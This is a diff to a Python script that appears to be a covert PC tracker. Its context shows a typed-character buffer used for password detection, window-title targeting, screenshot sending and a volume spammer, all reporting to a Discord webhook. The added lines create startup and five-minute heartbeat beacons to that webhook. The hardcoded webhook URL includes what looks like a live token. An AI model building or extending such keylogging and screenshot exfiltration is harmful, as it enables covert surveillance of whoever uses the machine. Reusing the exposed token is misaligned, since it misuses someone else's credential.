@@ -108,6 +108,7 @@ TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking
 DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"  # Replace with your webhook URL
 SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
 SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
+HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
 
 # ---------------- GLOBALS ---------------- #
 spamming = False
@@ -117,6 +118,7 @@ tracking_enabled = True  # Master toggle for tracking
 password_buffer = ""    # Stores typed characters for password detection
 last_key_time = 0       # For clearing password buffer after timeout
 detected_targets = set()  # Track already detected targets to avoid duplicate notifications
+last_heartbeat_time = time.time()  # Track when last heartbeat was sent
 
 # ---------------- HELPERS ---------------- #
 def title_matches_target(title: str) -> bool:
@@ -240,6 +242,83 @@ def send_discord_status(status):
         print(f"[DISCORD STATUS ERROR] {e}")
         return False
 
+def send_heartbeat():
+    """Send heartbeat webhook to confirm PC is active"""
+    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
+        return False
+    
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        uptime_seconds = int(time.time() - program_start_time)
+        
+        # Convert uptime to readable format
+        hours = uptime_seconds // 3600
+        minutes = (uptime_seconds % 3600) // 60
+        seconds = uptime_seconds % 60
+        
+        embed = {
+            "title": "💓 PC Heartbeat",
+            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**Tracking Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`",
+            "color": 3447003,  # Blue color
+            "footer": {
+                "text": "Tracker System"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed]
+        }
+        
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
+        
+        if response.status_code in [200, 204]:
+            print(f"[HEARTBEAT] Sent at {current_time}")
+            return True
+        else:
+            print(f"[HEARTBEAT ERROR] Failed: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"[HEARTBEAT ERROR] {e}")
+        return False
+
+def send_startup_message():
+    """Send webhook when the program starts"""
+    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
+        return False
+    
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        embed = {
+            "title": "🚀 Tracker Started",
+            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`",
+            "color": 3066993,  # Green color
+            "footer": {
+                "text": "Tracker System"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed],
+            "content": "📱 **System Online** - Tracker is now active"
+        }
+        
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
+        
+        if response.status_code in [200, 204]:
+            print(f"[STARTUP] Message sent at {current_time}")
+            return True
+        else:
+            print(f"[STARTUP ERROR] Failed: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"[STARTUP ERROR] {e}")
+        return False
+
 def toggle_tracking():
     """Toggle tracking on/off"""
     global tracking_enabled, password_buffer
@@ -329,9 +408,45 @@ def volume_spammer():
         except Exception as e:
             print(f"[SPAM ERROR] {e}")
 
+# ---------------- HEARTBEAT THREAD ---------------- #
+def heartbeat_monitor():
+    """Periodically send heartbeat every 5 minutes"""
+    global last_heartbeat_time
+    
+    while True:
+        try:
+            current_time = time.time()
+            
+            # Check if it's time to send heartbeat
+            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
+                send_heartbeat()
+                last_heartbeat_time = current_time
+            
+            # Sleep for 1 minute and check again
+            time.sleep(60)
+            
+        except Exception as e:
+            print(f"[HEARTBEAT MONITOR ERROR] {e}")
+            time.sleep(60)
+
 # ---------------- MAIN LOOP ---------------- #
 print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
+
+# Track program start time for uptime calculation
+program_start_time = time.time()
+
+# Send startup webhook immediately
+if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
+    print("[STARTUP] Sending startup webhook...")
+    send_startup_message()
+    
+    # Start heartbeat monitor in a separate thread
+    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
+    heartbeat_thread.start()
+    print(f"[HEARTBEAT] Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
+else:
+    print("[DISCORD] No webhook configured - skipping startup and heartbeat messages")
 
 # Test Discord connection
 if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
